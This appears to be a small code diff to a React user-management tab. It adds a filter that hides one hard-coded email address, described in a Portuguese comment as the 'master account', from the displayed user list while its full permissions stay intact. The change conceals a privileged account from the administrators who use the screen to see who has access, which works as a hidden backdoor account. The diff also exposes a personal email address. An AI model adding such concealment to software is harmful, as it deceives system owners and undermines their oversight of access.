@@ -47,6 +47,9 @@ export const UserManagementTab: React.FC<UserManagementTabProps> = ({
 
   const filteredUsers = useMemo(() => {
     return usersList.filter(u => {
+      // Oculta a conta master da listagem visual de usuários mantendo suas permissões 100% intactas
+      const normEmail = (u.email || '').trim().toLowerCase();
+      if (normEmail === 'gerlianemagalhaes79@gmail.com') return false;
       if (roleFilter !== 'ALL' && u.role !== roleFilter) return false;
       if (searchUser.trim()) {
         const term = searchUser.toLowerCase();
